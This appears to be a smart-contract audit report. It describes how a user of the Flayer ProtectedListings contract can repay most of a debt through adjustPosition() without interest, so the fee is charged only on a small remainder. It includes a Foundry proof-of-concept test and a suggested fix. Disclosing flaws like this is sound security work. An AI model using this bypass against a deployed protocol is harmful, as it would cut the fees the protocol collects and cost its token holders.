# User can pay almost no interest if he first pays most of the debt through ProtectedListings.sol#adjustPosition()

### Summary

When you've created a protected listing, the token you've taken against is debt and **accrues interest over time**.
You can use the `adjustPosition()` to repay most of the debt and then unlock it via `unlockProtectedListing()`, the latter actually gives it back and calculates interest, but it calculates it on the `tokenTaken` property, which can be repaid to a big extent (almost 100%) without interest in `adjustPosition()`.

### Root Cause

This logic accounts for interest/fee in unlockProtectedListing(), but it is missing in adjustPosition() -> https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/ProtectedListings.sol#L303-L305

# The logic that's present in unlockProtectedListing(), but missing in adjustPosition

``` solidity
uint fee = unlockPrice(_collection, _tokenId) * 10 ** denomination;
collectionToken.burnFrom(msg.sender, fee);

### Internal pre-conditions

User needs to have a protected listing with token taken against the listing.


### External pre-conditions

_No response_

### Attack Path

Steps:
1. User A decides to lock his NFT and **create a protected listing** in return for collection tokens.
2. Those collection tokens are **basically debt and debt accrues interest** over time.
3. User A can repay **>95% of the debt interest free** in `adjustPosition()` first,
 and then pay interest only on the remaining `tokenTaken` value in `unlockProtectedListing()`, 
 to unlock his NFT,  with the interest being **times and times less interest** than intended

### Impact

The protocol will **burn less fees** (potentially tens of times or more) which in the long run may make the `collectionToken` less valuable due to dilution


### PoC

# POC is running in ProtectedListings.t.sol
``` solidity
function test_CanAvoidInterestWhenPayingPartially(address payable _owner, uint _tokenId) public {
       // POC in steps
       // 1. User A locks his protected listings for tokens
       // 2. User A accrues interest as apparent in the docs and unlockProtectedListing()
       // 3. User A decides to bypass this and pay >95% of his debt in the adjustPosition()
       // because in this function there's no accounting for the interest as in the unlockProtectedListing()
       // 4. User A can pay >95% his debt interest fee in adjustPosition() and only invoke 
       // unlockProtectedListing() to pay the last <5% of the debt and the interest will be applied
       // to this value (<5%), not on the initial taken, which is a serious issue because the interest will be
       // applied on a very small value

        _assumeValidTokenId(_tokenId);

        _assumeValidAddress(_owner);

        erc721a.mint(_owner, _tokenId);

        vm.prank(_owner);
        erc721a.approve(address(protectedListings), _tokenId);

        IProtectedListings.ProtectedListing memory listing = IProtectedListings.ProtectedListing({
            owner: _owner,
            tokenTaken: 0.65 ether,
            checkpoint: 0
        });

         // Create our listing
        vm.startPrank(_owner);
        _createProtectedListing({
            _listing: IProtectedListings.CreateListing({
                collection: address(erc721a),
                tokenIds: _tokenIdToArray(_tokenId),
                listing: listing
            })
        });

        vm.stopPrank();

        vm.warp(block.timestamp + 5 days);
        
        vm.startPrank(address(listings));
        
        protectedListings.createCheckpoint(address(erc721a));

        vm.stopPrank();
        vm.startPrank(_owner);
        
        locker.collectionToken(address(erc721a)).approve(address(protectedListings), 0.625 ether);
        // 0.65 ether
        console.log(locker.collectionToken(address(erc721a)).balanceOf(_owner));

        // repaying debt
        protectedListings.adjustPosition(address(erc721a), _tokenId, -0.625 ether);
        // 0.025 ether and interest on the 0.025 ether
        uint unlockPriceBefore = protectedListings.unlockPrice(address(erc721a), _tokenId);

        // taking debt
        protectedListings.adjustPosition(address(erc721a), _tokenId, 0.625 ether);
        // 0.65 ether and interest on the 0.65 ether
        uint unlockPriceAfter = protectedListings.unlockPrice(address(erc721a), _tokenId);

        // 0.65 ether
        console.log(locker.collectionToken(address(erc721a)).balanceOf(_owner));
        
        // We can see a smaller price due to less interest,
        // for unlocking the NFT is we have paid 0.625 ether partially
               
        // Feel free to log the data, the interest accrued in the unlockPriceBefore 
        // is >x20 times than the interest in unlockPriceAfter (interest -> the value above 0.65 ether)

        // So the fee will be times and times less than if I try to pay it all on one go
        assertNotEq(unlockPriceBefore + 0.625 ether, unlockPriceAfter);
    }

### Mitigation

Account for interest/fee in `adjustPosition()` as well
